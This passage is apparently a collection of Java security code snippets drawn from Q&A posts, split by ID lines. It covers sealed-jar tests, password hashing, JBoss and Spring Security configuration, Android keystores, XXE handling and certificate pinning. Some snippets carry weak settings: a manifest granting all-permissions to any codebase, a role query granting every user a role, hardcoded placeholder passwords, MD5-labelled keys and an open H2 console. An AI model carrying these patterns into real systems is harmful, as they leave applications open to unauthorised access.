     * Only one of these tests can be run at a time because one a package has been loaded, it cannot
     * be unloaded again. Because of this, each test must be run separately.
     */
    public class TestPackages {
    
    	@Test
    	public void SealedFail1() {
    		// Instantiate instance of TestClass from sealed .jar.
    		TestClass t = new TestClass();
    
    		// Following should blow up because package com.company.testjar has already
    		// been loaded by instantiating TestClass above.
    		try {
    			new Bogus();
    			
    			// Should not get here. Throw if we do.
    			assertFalse(true);
    		} catch (SecurityException ex) {
    			// Expected.
    		}
    	}
    	
    	@Test
    	public void SealedFail2() {
    		Bogus b = new Bogus();
    
    		// Following should blow up because package com.company.testjar has already
    		// been loaded by instantiating Bogus above.
    		try {
    			new TestClass();
    			
    			// Should not get here. Throw if we do.
    			assertFalse(true);
    		} catch (SecurityException ex) {
    			// Expected.
    		}
    	}
    	
    	/**
    	 * Test to see if instantiating object from package in a sealed .jar will effectively
    	 * load and seal all packages in that .jar.
    	 */
    	@Test
    	public void SealedFail3() {
    		// Instantiate object from com.company.testjar2 package. This package will now be
    		// loaded and sealed.
    		TestClass2 t2 = new TestClass2();
    
    		// Instantiate object from com.company.testjar package NOT from sealed .jar.
    		// This should work because this package has not been sealed yet!
    		Bogus b = new Bogus();
    
    		// This should now throw because the com.company.testjar package has already
    		// been loaded by instantiating Bogus above, and the TestClass is from that
    		// same package from the sealed .jar.
    		try {
    			new TestClass();
    			
    			// Should not get here. Throw if we do.
    			assertFalse(true);
    		} catch (SecurityException ex) {
    			// Expected.
    		}
    	}
    
    	/**
    	 * Test to see if instantiating an object from a sealed .jar prevents us from then
    	 * instantiating an instance of an object from a sub-package NOT defined in the
    	 * same .jar.
    	 */
    	@Test
    	public void SubPackage() {
    		// Instantiate instance of TestClass from sealed .jar. Loads and seals the
    		// com.company.testjar package.
    		TestClass t = new TestClass();
    		// Now attempt to instantiate an instance of an object from a sub-package of
    		// com.company.testjar which is not defined in the same .jar.
    		new SubBogus();
    	}
		/**
		 * Test to see if instantiating an object from a sealed .jar prevents us from then
		 * instantiating an instance of an object from a parent package NOT defined in the
		 * same .jar.
		 */
		@Test
		public void ParentPackage() {
			// Instantiate instance of TestClass from sealed .jar. Loads and seals the
			// com.company.testjar package.
			TestClass t = new TestClass();
			// Now attempt to instantiate an instance of an object from the parent-package of
			// com.company.testjar which is not defined in the same .jar.
			new ParentBogus();
		}
    }
---UNIQUEIDFORSNIP---|202709167|    recoveredHMACTag.equals(newHMACTag)
---UNIQUEIDFORSNIP---|202709169|    java.util.Arrays.equals(recoveredHMACTag, newHMACTag)
---UNIQUEIDFORSNIP---|202712096|    <module-option name="hashAlgorithm" value="SHA-1"/>
    <module-option name="hashEncoding" value="hex"/>
---UNIQUEIDFORSNIP---|202751763|    System.getProperty("javax.net.ssl.trustStore")
---UNIQUEIDFORSNIP---|203370382|    $('form')[0].submit();
    //or e.target.submit();
---UNIQUEIDFORSNIP---|203413879|    import java.nio.charset.StandardCharsets;
    import java.security.MessageDigest;
    import java.security.NoSuchAlgorithmException;
   
    public String get_SHA_512_SecurePassword(String passwordToHash, String   salt){
	String generatedPassword = null;
		try {
		     MessageDigest md = MessageDigest.getInstance("SHA-512");
			 md.update(salt.getBytes(StandardCharsets.UTF_8));
			 byte[] bytes = md.digest(passwordToHash.getBytes(StandardCharsets.UTF_8));
			 StringBuilder sb = new StringBuilder();
			 for(int i=0; i< bytes.length ;i++){
				sb.append(Integer.toString((bytes[i] & 0xff) + 0x100, 16).substring(1));
			 }
			 generatedPassword = sb.toString();
		    } 
	       catch (NoSuchAlgorithmException e){
			e.printStackTrace();
		   }
		return generatedPassword;
	}
	
---UNIQUEIDFORSNIP---|203427170|    Manifest-Version: 1.0
    Application-Library-Allowable-Codebase: *
    Application-Name: app-name
    Build-Jdk: 1.7.0_79
    Permissions: all-permissions
    Caller-Allowable-Codebase: *
    Codebase: *
---UNIQUEIDFORSNIP---|203881408|    /subsystem=security/security-domain=other/mapping=classic:add
    /subsystem=security/security-domain=other/mapping=classic/mapping-module=mapRoleToAllUsers:add(code="org.jboss.security.mapping.providers.role.DatabaseRolesMappingProvider", type="role", module-options=[("dsJndiName"=>"java:jboss/datasources/ExampleDS"), ("rolesQuery"=>"SELECT 'ApplicationRealm' FROM Dual WHERE ?!=''")])
    reload
---UNIQUEIDFORSNIP---|203881413|    <security-domain name="other" cache-type="default">
        <authentication>
            <login-module code="Remoting" flag="optional">
                <module-option name="password-stacking" value="useFirstPass"/>
            </login-module>
            <login-module code="RealmDirect" flag="required">
                <module-option name="password-stacking" value="useFirstPass"/>
            </login-module>
        </authentication>
        <mapping>
            <mapping-module name="mapRoleToAllUsers" code="org.jboss.security.mapping.providers.role.DatabaseRolesMappingProvider" type="role">
                <module-option name="dsJndiName" value="java:jboss/datasources/ExampleDS"/>
                <module-option name="rolesQuery" value="SELECT 'ApplicationRealm' FROM Dual WHERE ?!=''"/>
            </mapping-module>
        </mapping>
    </security-domain>
---UNIQUEIDFORSNIP---|203881415|    <jboss-web>
    	<security-domain>other</security-domain>
    </jboss-web>
---UNIQUEIDFORSNIP---|204019767|        public final class ProjectKey {
            /* prevent instantiation */ private ProjectKey(){}
            private static final String PROJECT_KEY = loadKey();
            public static String getKey () {
                if (PROJECT_KEY != null) return PROJECT_KEY;
                throw new IllegalStateException(
                    "Key file not present; find somebody with the file and place in: " +
                    "src/main/resources/java/com/yourcompany/yourproject/keys/KeyFile.txt");
            }
            private static String loadKey() {
                InputStream in = ProjectKey.class.getResourceAsStream("KeyFile.txt");
                try {
                    return in == null ? null : new Scanner(in, "UTF-8").next();
                } finally {
                    if (in != null) in.close();
                }
            }
        }
---UNIQUEIDFORSNIP---|204204113|    import java.awt.image.BufferedImage;
    import java.io.File;
    import java.net.URL;
    import java.nio.file.Files;
    import java.util.Base64;
    import java.util.UUID;
    import javax.imageio.ImageIO;
    import org.slf4j.Logger;
    import org.slf4j.LoggerFactory;
    @Override
    public String getImage(String productNumber) throws EcomWebException {
	try {
	    BufferedImage image = ImageIO.read(url);
        File file = new File(guid.toString() + ".jpg");
	    ImageIO.write(image, "jpg", file);
	    String base64ImageString = Base64.getEncoder().encodeToString(Files.readAllBytes(file.toPath()));
	    file.delete();
	    return base64ImageString;
	} catch (Exception e) {
	    throw new EcomWebException(IMAGE_NOT_FOUND_MESSAGE + productNumber, e);
	}
    }
---UNIQUEIDFORSNIP---|205010675|    public class Shullbit {
      public static void main( String[] args ) {
        while( true )  {
          System.out.println( "Still not convinced ?!?" );
          try {
            Thread.sleep(5000);
          }
          catch( Exception e ) {
            //
          }
        }
      }
    }
---UNIQUEIDFORSNIP---|205010677|    java version "1.8.0_45"
    Java(TM) SE Runtime Environment (build 1.8.0_45-b14)
    Java HotSpot(TM) Server VM (build 25.45-b02, mixed mode)
---UNIQUEIDFORSNIP---|205010679|    sudo netstat -anop | grep java
    tcp6       0      0 :::56066                :::*                    LISTEN      18797/java       off (0.00/0/0)
    unix  2      [ ]         STREAM     CONNECTED     30209    18797/java
---UNIQUEIDFORSNIP---|205010681|    sudo netstat -anop | grep java  | wc -l
    0
---UNIQUEIDFORSNIP---|205112426|    try {
            String test = encrypt("My name is Nam");
            Log.e("TEST", "xxxx encrypted: "+ test);
            Log.e("TEST", "xxxx decrypted: "+ decrypt(test));
        } catch (Exception e) {
            e.printStackTrace();
        }
---UNIQUEIDFORSNIP---|205112428|    Log.e("ERROR", "AFTER: "+ pojo.getName());
---UNIQUEIDFORSNIP---|205112430|    Log.e("ERROR", "AFTER: "+ securityPOJO.getName());
---UNIQUEIDFORSNIP---|205112432|    Log.e("ERROR", "AFTER: "+ CryptUtils.decrypt( pojo.getName() ));
---UNIQUEIDFORSNIP---|205248737|	// Generate Keys
	ECGenParameterSpec ecGenSpec = new ECGenParameterSpec("secp256r1");
	KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("ECDSA", "BC");
	keyPairGenerator.initialize(ecGenSpec, new SecureRandom());
	java.security.KeyPair pair = keyPairGenerator.generateKeyPair();
	ECPrivateKey privateKey = (ECPrivateKey) pair.getPrivate();
	ECPublicKey publicKeyExpected = (ECPublicKey) pair.getPublic();
	// Expected public key
	System.out.print("Expected Public Key: " +
	        BaseEncoding.base64Url().encode(publicKeyExpected.getEncoded()));
	// Generate public key from private key
	KeyFactory keyFactory = KeyFactory.getInstance("ECDSA", "BC");
	ECParameterSpec ecSpec = ECNamedCurveTable.getParameterSpec("secp256r1");
	ECPoint Q = ecSpec.getG().multiply(privateKey.getD());
	byte[] publicDerBytes = Q.getEncoded(false);
	ECPoint point = ecSpec.getCurve().decodePoint(publicDerBytes);
	ECPublicKeySpec pubSpec = new ECPublicKeySpec(point, ecSpec);
	ECPublicKey publicKeyGenerated = (ECPublicKey) keyFactory.generatePublic(pubSpec);
	// Generated public key from private key
	System.out.print("Generated Public Key: " +
	        BaseEncoding.base64Url().encode(publicKeyGenerated.getEncoded()));
---UNIQUEIDFORSNIP---|205256900|    dependencies {
        compile 'com.scottyab:secure-preferences-lib:0.1.4'
    }
    
---UNIQUEIDFORSNIP---|205256902|    SharedPreferences prefs = new SecurePreferences(context, null, "my_custom_prefs.xml");
---UNIQUEIDFORSNIP---|205256904|    SharedPreferences.Editor editor = prefs.edit();
    editor.putInt("userPin", pin).commit();
    int pin = prefs.getInt("userPin", default);
---UNIQUEIDFORSNIP---|205319372|    if(android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.HONEYCOMB) {
            getWindow().setFlags(WindowManager.LayoutParams.FLAG_SECURE, WindowManager.LayoutParams.FLAG_SECURE);
    }
---UNIQUEIDFORSNIP---|205415573|    public class MySimpleUrlAuthenticationSuccessHandler implements AuthenticationSuccessHandler {
    
        protected Log logger = LogFactory.getLog(this.getClass());
    
        private RedirectStrategy redirectStrategy = new DefaultRedirectStrategy();
    
        @Override
        public void onAuthenticationSuccess(HttpServletRequest request, 
          HttpServletResponse response, Authentication authentication)
          throws IOException {
    
            handle(request, response, authentication);
            clearAuthenticationAttributes(request);
        }
    
        protected void handle(HttpServletRequest request, 
          HttpServletResponse response, Authentication authentication)
          throws IOException {
    
            String targetUrl = determineTargetUrl(authentication);
    
            if (response.isCommitted()) {
                logger.debug(
                  "Response has already been committed. Unable to redirect to "
                  + targetUrl);
                return;
            }
    
            redirectStrategy.sendRedirect(request, response, targetUrl);
        }
    
        protected String determineTargetUrl(Authentication authentication) {        
            boolean isAdmin = false;
    		boolean isManager = false;
            boolean isEmployee = false;
            Collection<? extends GrantedAuthority> authorities = authentication.getAuthorities();
            for (GrantedAuthority grantedAuthority : authorities) {
                if (grantedAuthority.getAuthority().equals("ROLE_ADMIN")) {
                    isAdmin = true;
                    break;
                } else if (grantedAuthority.getAuthority().equals("ROLE_MANAGER")) {
                    isManager = true;
                    break;
                } else if (grantedAuthority.getAuthority().equals("ROLE_EMPLOYEEE")) {
                    isEmployee = true;
                    break;
                }
            }
    
            if (isAdmin) {
                return "/welcome2.xhtml";
            } else if (isManager) {
                return "/welcome.xhtml";
            } else if (isEmployee) {
                return "/welcome.xhtml";
            } else {
                throw new IllegalStateException();
            }
        }
    
        protected void clearAuthenticationAttributes(HttpServletRequest request) {
            HttpSession session = request.getSession(false);
            if (session == null) {
                return;
            }
            session.removeAttribute(WebAttributes.AUTHENTICATION_EXCEPTION);
        }
    
        public void setRedirectStrategy(RedirectStrategy redirectStrategy) {
            this.redirectStrategy = redirectStrategy;
        }
        protected RedirectStrategy getRedirectStrategy() {
            return redirectStrategy;
        }
    }
---UNIQUEIDFORSNIP---|205415576|    http.authorizeRequests()
                    //Permit access to the H2 console
                    .antMatchers("/h2-console/**").permitAll()
                    //Permit access for all to error pages
                    .antMatchers("/error/**")
                    .permitAll()
                    // Only access with admin role
                    .antMatchers("/admin/**")
                    .hasAnyAuthority("ADMIN")
                    //Permit access only for some roles
                    .antMatchers("/secured/**")
                    .hasAnyAuthority("ADMIN", "MANAGER", "EMPLOYEE")
                    //If user doesn't have permission, forward him to login page
                    .and()
                    .formLogin()
                    .loginPage("/login.xhtml")
                    .loginProcessingUrl("/login")
                    .defaultSuccessUrl("/secured/welcome.xhtml").successHandler(successHandler()) ;
    @Bean
    public AuthenticationSuccessHandler successHandler() {
        return new MySimpleUrlAuthenticationSuccessHandler();
    }
---UNIQUEIDFORSNIP---|205644200|    <servlet>
		<servlet-name>mvc-dispatcher</servlet-name>
		<servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
		<load-on-startup>1</load-on-startup>
	</servlet>
	<servlet-mapping>
		<servlet-name>mvc-dispatcher</servlet-name>
		<url-pattern>/</url-pattern>
	</servlet-mapping>
---UNIQUEIDFORSNIP---|205644209|        <beans xmlns="http://www.springframework.org/schema/beans"
    	xmlns:context="http://www.springframework.org/schema/context"
    	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:mvc="http://www.springframework.org/schema/mvc"
    	xsi:schemaLocation="
            http://www.springframework.org/schema/beans     
            http://www.springframework.org/schema/beans/spring-beans-3.0.xsd
            http://www.springframework.org/schema/context 
            http://www.springframework.org/schema/context/spring-context-3.0.xsd
            http://www.springframework.org/schema/mvc
            http://www.springframework.org/schema/mvc/spring-mvc-3.0.xsd
            http://www.springframework.org/schema/web-services
            http://www.springframework.org/schema/web-services/web-services-2.0.xsd">
    
    	<context:component-scan base-package="com.yourpackage" />
    	<bean id="messageFactory" class="org.springframework.ws.soap.saaj.SaajSoapMessageFactory" />
    	<bean id="webServiceTemplate" class="org.springframework.ws.client.core.WebServiceTemplate">
    		<constructor-arg ref="messageFactory" />
    		<property name="defaultUri"
    			value="${backend.ip}devices" />
    		<property name="interceptors">
    
    			<list>
    				<ref local="xwsSecurityInterceptor" />
    			</list>
    		</property>
    
    	</bean>
    
    	<bean id="xwsSecurityInterceptor"
    		class="org.springframework.ws.soap.security.xwss.XwsSecurityInterceptor">
    		<property name="policyConfiguration" value="/WEB-INF/securityPolicy.xml" />
    		<property name="callbackHandlers">
    			<list>
    				<ref bean="keyStoreHandler" />
    			</list>
    		</property>
    	</bean>
    
    	<bean id="keyStore"
    		class="org.springframework.ws.soap.security.support.KeyStoreFactoryBean">
    		<property name="password" value="yourpassword" />
    		<property name="location" value="/WEB-INF/yourkeystore.jks" />
    	</bean>
    
    	<bean id="keyStoreHandler"
    		class="org.springframework.ws.soap.security.xwss.callback.KeyStoreCallbackHandler">
    		<property name="keyStore" ref="keyStore" />
    		<property name="privateKeyPassword" value="yourpassword" />
    		<property name="defaultAlias" value="client" />
    	</bean>
    
    	<bean
    		class="org.springframework.web.servlet.view.InternalResourceViewResolver">
    		<property name="prefix">
    			<value>/WEB-INF/pages/</value>
    		</property>
    		<property name="suffix">
    			<value>.jsp</value>
    		</property>
    	</bean>
    
    	<!-- LOAD PROPERTIES -->
    	<context:property-placeholder
    		location="WEB-INF/config.properties"
    		ignore-unresolvable="true" />
    
    	<mvc:resources mapping="/resources/**" location="/resources/" />
    	<mvc:annotation-driven />
    
    </beans>
---UNIQUEIDFORSNIP---|205644211|        <xwss:SecurityConfiguration dumpMessages="true"     xmlns:xwss="http://java.sun.com/xml/ns/xwss/config">
       <xwss:Sign includeTimestamp="true">
    		 <xwss:X509Token certificateAlias="yourcertificatealias" /> 
    	</xwss:Sign> 
    </xwss:SecurityConfiguration>
---UNIQUEIDFORSNIP---|205644213|    <dependency>
			<groupId>com.sun.xml.wss</groupId>
			<artifactId>xws-security</artifactId>
			<version>3.0</version>
			<exclusions>
				<exclusion>
					<groupId>javax.xml.crypto</groupId>
					<artifactId>xmldsig</artifactId>
				</exclusion>
			</exclusions>
		</dependency>
---UNIQUEIDFORSNIP---|205733212|    public class SaxParser extends DefaultHandler
		implements ContentHandler, DTDHandler, EntityResolver{
    
    public transient static final String STYLE_SHEET_TAG = "xml-stylesheet";
    public transient static final String EXTERNAL_ENTITY = "ExternalEntity";
    public static void main(String[] args) {
	    new SaxParser().execute();
    }
    
    public void execute() {
		String pathFileXml = "test/XML.xml";
		
		final XMLReader parser = new SAXParser();
		parser.setContentHandler(this);
		parser.setDTDHandler(this);
		parser.setEntityResolver(this);
		
		try {
			parser.parse(pathFileXml);
		} catch (IOException e) {
			e.printStackTrace();
		} catch (SAXException e) {
			
			if (SaxParser.STYLE_SHEET_TAG.equals(e.getMessage())
					|| SaxParser.EXTERNAL_ENTITY.equals(e.getMessage())) {
				
				System.out.println("CATCH ERRORE");
			}
			e.printStackTrace();
		}
		System.out.println("OK");
    }
    
    @Override
	public void processingInstruction(String target, String data)
			throws SAXException {
		System.out.println("Processing Instruction");
		System.out.println("PI=> target: " + target + ", data: " + data);
		
		if (STYLE_SHEET_TAG.equalsIgnoreCase(target.trim())) {
			throw new SAXException(STYLE_SHEET_TAG);
		}
		return;
	}
    	@Override
        public InputSource resolveEntity(String publicId, String systemId)
			throws IOException, SAXException {
		
		System.out.println("publicId: " + publicId + ", systemId: " + systemId);
		throw new SAXException(SaxParser.EXTERNAL_ENTITY);
		
		
	}
	}
---UNIQUEIDFORSNIP---|205769579|    NoSuchPaddingException, NoSuchAlgorithmException
    InvalidAlgorithmParameterException, InvalidKeyException,
    BadPaddingException, IllegalBlockSizeException
---UNIQUEIDFORSNIP---|205894552|    @Override
    public void configure(WebSecurity web) throws Exception {
        web.ignoring()
           .antMatchers("/assets/**" ,"/showReg", "/", "/index.html", "/registerUser", "/login", "/showLogin", "/login/*", "/reservations/*");
    }
---UNIQUEIDFORSNIP---|205905264|    <p>Welcome, <c:out value="${user.name}" />!</p>
    ...
    <input type="text" name="foo" value="${fn:escapeXml(param.foo)}" />
---UNIQUEIDFORSNIP---|206182870|     @Path("/")
            public class Employee {
                @Inject
                static EmployeeService employeeService;
    
                @GET
                @Path("/xml")
                @Produces({ "application/xml" })
                @RolesAllowed({"employee"})
                public String getHelloWorldXML() {
                    return "<xml><result>" +    employeeService.createHelloMessage("Employee") + "</result></xml>";
                }
    
            }
---UNIQUEIDFORSNIP---|206182873|    <?xml version="1.0" encoding="UTF-8"?>
    <beans xmlns="http://java.sun.com/xml/ns/javaee"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
          http://java.sun.com/xml/ns/javaee 
          http://java.sun.com/xml/ns/javaee/beans_1_0.xsd">
          
          <!-- An application that uses CDI must have a file named beans.xml. 
          The file can be completely empty (it has content only in certain 
          limited situations), but it must be present. -->
          
    </beans>
---UNIQUEIDFORSNIP---|206249770|    public class CustomAuthenticationFilter extends FormAuthenticationFilter {
        private Map<String, String> loginUrlByUserAgent = new HashMap<String, String>();
    
        public void setLoginUrls(final Map<String, String> loginUrlByUserAgent) {
            this.loginUrlByUserAgent = loginUrlByUserAgent;
        }
    
        protected void redirectToLogin(final ServletRequest request, final ServletResponse response) throws IOException {
            final String loginUrl = getLoginUrl(request);
            WebUtils.issueRedirect(request, response, loginUrl);
        }
    
        private String getLoginUrl(final ServletRequest request) {
            // check user agent
            final String userAgent = getUserAgent(request);
            // and return appropriate login url
            return userAgent != null && loginUrlByUserAgent.containsKey(userAgent) ?
                    loginUrlByUserAgent.get(userAgent) :
                    getLoginUrl();
        }
    
        private String getUserAgent(final ServletRequest request) {
            // get "User-Agent" header
        }
    }
---UNIQUEIDFORSNIP---|206349261|	<security:http create-session="stateless"
		entry-point-ref="digestEntryPoint" pattern="/provider/**"
		use-expressions="true">
		<security:intercept-url pattern="/provider/**"
			access="isAuthenticated()" />
		<security:http-basic />
		<security:custom-filter ref="digestFilter"
			after="BASIC_AUTH_FILTER" />
	</security:http>
---UNIQUEIDFORSNIP---|206569702|    graphics2d.drawRenderedImage(image, new AffineTransform());
---UNIQUEIDFORSNIP---|206569704|     private final class DrawRenderedImage implements PrivilegedAction
	{
		private Graphics2D graphics2D = null;
		public DrawRenderedImage(Graphics2D graphics)
		{
			graphics2D = graphics;
			// TODO Auto-generated constructor stub
		}
		public Object run()
		{
			
            	graphics2D.drawRenderedImage(image, new AffineTransform());
            	
            
			return new Boolean(true);
		}
	}
---UNIQUEIDFORSNIP---|206569709|    AccessController.doPrivileged(new DrawRenderedImage(graphics2d));
---UNIQUEIDFORSNIP---|206639876|    // salt and masterHash can be cached for multiple requests
    salt = SecureRandom().nextBytes(8 bytes)
    // adjust iterations (65336) according to appropriate performance:
    masterHash = pbkdf2(password, salt, 65336)
    iv = SecureRandom().nextBytes(16 bytes)
    sessionKey = SecureRandom().nextBytes(16 bytes)
    encKey = hmacSha256(masterHash, "enc") // crop according to intended AES key size
    macKey = hmacSha256(masterHash, "mac")
    ciphertext = AES(encKey, iv, sessionKey + ts.length + ts)
    tag = hmacSha256(macKey, username + salt + iv + ciphertext)
    return salt + iv + ciphertext + tag
---UNIQUEIDFORSNIP---|206644133|    <security-constraint>
	    <web-resource-collection>
	        <web-resource-name>All Access</web-resource-name>
	        <url-pattern>/*</url-pattern>
	        <http-method>DELETE</http-method>
	        <http-method>PUT</http-method>
	        <http-method>HEAD</http-method>
	        <http-method>OPTIONS</http-method>
	        <http-method>TRACE</http-method>
	        <http-method>GET</http-method>
	        <http-method>POST</http-method>
	    </web-resource-collection>
	    <user-data-constraint>
	        <transport-guarantee>CONFIDENTIAL</transport-guarantee>
	    </user-data-constraint>
    </security-constraint>
    <login-config>
        <auth-method>BASIC</auth-method>
 		<realm-name>ApplicationRealm</realm-name>
    </login-config>
	<security-role>
        <role-name>user</role-name>
    </security-role>
---UNIQUEIDFORSNIP---|206644137|	<jboss-web>
    	<security-domain>java:/jaas/other</security-domain>
	</jboss-web>
---UNIQUEIDFORSNIP---|206644141|	C:\dev\jboss-eap-6.2\bin>add-user
	What type of user do you wish to add?
	 a) Management User (mgmt-users.properties)
	 b) Application User (application-users.properties)
	(a): b
	
	Enter the details of the new user to add.
	Using realm 'ApplicationRealm' as discovered from the existing property files.
	Username : johngalt
	Password :
	Re-enter Password :
	What groups do you want this user to belong to? (Please enter a comma separated list, or leave blank for none)[  ]: user
	About to add user 'johngalt' for realm 'ApplicationRealm'
	Is this correct yes/no? yes
	Added user 'johngalt' to file 'C:\dev\jboss-eap-6.2\standalone\configuration\application-users.properties'
	Added user 'johngalt' to file 'C:\dev\jboss-eap-6.2\domain\configuration\application-users.properties'
	Added user 'johngalt' with groups user to file 'C:\dev\jboss-eap-6.2\standalone\configuration\application-roles.properties'
	Added user 'johngalt' with groups user to file 'C:\dev\jboss-eap-6.2\domain\configuration\application-roles.properties'
	Is this new user going to be used for one AS process to connect to another AS process?
	e.g. for a slave host controller connecting to the master or for a Remoting connection for server to server EJB calls.
	yes/no? no
	Press any key to continue . . .
	C:\dev\jboss-eap-6.2\bin>
	 
---UNIQUEIDFORSNIP---|206695370|    Protocol: Multiple
    Subcomponent: Libraries
    Remote Exploit without Auth.?: Yes
    Base Score: 10 (out of 10)
    Access Vector: Network
    Access Complexity: Low
    Authentication: None
    Confidentiality: Complete
    Integrity: Complete
    Availability: Complete
    Versions affected: Java SE 5.0u51 and earlier
---UNIQUEIDFORSNIP---|206793262|    ECPrivateKey ecPrivKey = (ECPrivateKey) eckp.getPrivate();
    System.out.println(ecPrivKey.getS().toString(16));
---UNIQUEIDFORSNIP---|206836864|    public boolean setEntry(String alias, String secretKey) {
		
		boolean keyStoreEntryWritten = false;
		
		if (mKeystore != null && secretKey != null) {
			// store something in the key store
			SecretKeySpec sks = new SecretKeySpec(secretKey.getBytes(), "MD5");
			KeyStore.SecretKeyEntry ske = new KeyStore.SecretKeyEntry(sks);
			KeyStore.ProtectionParameter pp = new KeyStore.PasswordProtection(null);
			
			try {
				mKeystore.setEntry(alias, ske, pp);
				
				// save key store
				boolean success = saveKeyStore();
				
				if (success) {
					keyStoreEntryWritten = true;
				}
			} catch (KeyStoreException ex) {
				Log.e(TAG, "Failed to read keystore" + mKeyStoreName);
			}
		}
		return keyStoreEntryWritten;
	}
    private boolean saveKeyStore() {
		
		FileOutputStream fos = null;
		boolean keyStoreSaved = true;
		
		// generate key store path
		String keyStoreFilePath = generateKeyStoreFilePath(mKeyStoreName, mKeystoreDirectoryPath);
		
		
		try {
			fos = new FileOutputStream(keyStoreFilePath);
			mKeystore.store(fos, mKeyStorePassword.toCharArray());
		} catch (Exception ex) {
			keyStoreSaved = false;
			Log.e(TAG, "Failed to save keystore " + mKeyStoreName);
		} finally {
			if (fos != null) {
				try {
					fos.close();
				} catch (IOException ex) {
					keyStoreSaved = false;
					Log.e(TAG, "Failed to close FileOutputStream");
				}
			}
		}
		return keyStoreSaved;
	}
---UNIQUEIDFORSNIP---|206836866|    public String getEntry(String alias) {
		
		String secretStr = null;
		byte[] secret = null;
		
		if (mKeystore != null) {
			
			
			
			try {
				if (!mKeystore.containsAlias(alias)) {
					Log.w(TAG, new StringBuilder().append("Keystore ").append(mKeyStoreName)
							.append(" does not contain entry ").append(alias).toString());
					return null;
				}
			} catch (KeyStoreException ex) {
				Log.e(TAG, "Failed to read keystore entry " + alias);
			}
			
			// get my entry from the key store
			KeyStore.ProtectionParameter pp = new KeyStore.PasswordProtection(null);
			KeyStore.SecretKeyEntry ske = null;
			try {
				ske = (KeyStore.SecretKeyEntry) mKeystore.getEntry(alias, pp);
			} catch (Exception ex) {
				Log.e(TAG, "Failed to read keystore entry " + alias);
			}
			
			if (ske != null) {
				SecretKeySpec sks = (SecretKeySpec) ske.getSecretKey();
				secret = sks.getEncoded();
				
				if (secret != null) {
					secretStr = new String(secret);
					
					
				} else {
					Log.e(TAG, new StringBuilder().append("Read empty keystore entry ").append(alias).toString());
				}
			} else {
				Log.e(TAG, "Failed to read keystore entry " + alias);
			}
		}
		return secretStr;
	}
---UNIQUEIDFORSNIP---|206919791|    <VirtualHost www.mysite.com:80 >
        RewriteEngine on
        RewriteCond %{HTTP_HOST} www\.mysite\.com
        RewriteRule ^/(.*)$ ajp://localhost:8009/myapp/$1 [P,QSA,L]
    </VirtualHost>
---UNIQUEIDFORSNIP---|206919793|    <Proxy ajp://localhost:8009/myapp/admin/* >
        Order deny,allow
        Allow from all
        AllowOverride AuthConfig
        AuthType Basic
        AuthName "Admin"
        AuthUserFile /etc/apache2/passwd/admin.passwd
        Require valid-user
    </Proxy>
 
---UNIQUEIDFORSNIP---|207010036|    <form action="login.asp" method="post" class="form-horizontal" name="login-form" role="form" autocomplete="off">
      <input type="hidden" name="<%=STATIC_CSRF_TOKEN_NAME%>" value="<%=AntiXssInstance.HtmlAttributeEncode(GetExternalCSRFToken())%>" />
      <input type="email" class="form-control" id="email" name="email" placeholder="Email address">
      <input type="password" class="form-control" id="password" name="password" placeholder="Password">
      <button type="submit" class="btn btn-success">Login</button>
    </form>
---UNIQUEIDFORSNIP---|207010039|    <form action="login.asp" method="post" class="form-horizontal" name="login-form" role="form" autocomplete="off">
      <input type="hidden" name="<%=CSRF_TOKEN_NAME%>" value="<%=GetExternalCSRFToken()%>" />
      <input type="email" class="form-control" id="email" name="email" placeholder="Email address">
      <input type="password" style="display: none;" id="password-breaker" />
      <input type="password" class="form-control" id="password" name="password" placeholder="Password">
      <button type="submit" class="btn btn-success">Login</button>
    </form>
---UNIQUEIDFORSNIP---|207189935|    default-src 'self'; img-src example.com;
---UNIQUEIDFORSNIP---|207536260|    (...)
    public static class GetJsonTask extends AsyncTask<Void, Integer, AsyncResponse> {
        protected String jsonData;
        protected IGetJsonListener listener;
        protected Context context = null;
        protected String strUrl;
        public GetJsonTask(Context c, IGetJsonListener l, String strUrl) {
            super();
            listener = l;
            context = c;
            this.strUrl = strUrl;
        }
        @Override
        protected AsyncResponse doInBackground(Void... Void) {
            JsonObject jsonObjectResult = new JsonObject();
            APIStatus status;
            if (isConnected(context)) {
                HttpsURLConnection httpsURLConnection=null;
                try {
                    //THIS IS KEY: context contains only our CA cert
                    SSLContext sslContext = getSSLContext(context);
                    if (sslContext != null) {
                        //for HTTP BASIC AUTH if your server implements this
                        //String encoded = Base64.encodeToString(
                        //        ("your_user_name" + ":" + "your_pwd").getBytes(),
                        //        Base64.DEFAULT);
                        URL url = new URL(strUrl);
                        httpsURLConnection = (HttpsURLConnection) url.openConnection();
                        httpsURLConnection.setRequestMethod("GET");
                        httpsURLConnection.setRequestProperty("Content-length", "0");
                        httpsURLConnection.setUseCaches(false);
                        httpsURLConnection.setAllowUserInteraction(false);
                        //FOR HTTP BASIC AUTH
                        //httpsURLConnection.setRequestProperty("Authorization", "Basic " + encoded);
                        //THIS IS KEY: Set connection to use custom socket factory
                        httpsURLConnection.setSSLSocketFactory(sslContext.getSocketFactory());
                        //httpsURLConnection.setConnectTimeout(timeout);
                        //httpsURLConnection.setReadTimeout(timeout);
                        httpsURLConnection.connect();
                        status = getStatusFromCode(httpsURLConnection.getResponseCode());
                        listener.getJsonShowProgress(90);
                        if (status == APIStatus.OK) {
                            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpsURLConnection.getInputStream()));
                            StringBuilder stringBuilder = new StringBuilder();
                            String line;
                            while ((line = bufferedReader.readLine()) != null) {
                                stringBuilder.append(line);
                            }
                            bufferedReader.close();
                            JsonParser parser = new JsonParser();
                            String s = stringBuilder.toString();
                            jsonObjectResult = (JsonObject) parser.parse(s);
                        }
                    } else
                        status = APIStatus.AUTH_ERROR;
                    listener.getJsonShowProgress(99);
                //THIS IS KEY: this exception is thrown if the certificate
                //is signed by a CA that is not our CA
                } catch (SSLHandshakeException e) {
                    status = APIStatus.AUTH_ERROR;
                    //React to what is probably a man-in-the-middle attack
                } catch (IOException e) {
                    status = APIStatus.NET_ERROR;
                } catch (JsonParseException e) {
                    status = APIStatus.JSON_ERROR;
                } catch (Exception e) {
                    status = APIStatus.UNKNOWN_ERROR;
                } finally {
                    if (httpsURLConnection != null)
                        httpsURLConnection.disconnect();
                }
            } else {
                status = APIStatus.NET_ERROR;
            }
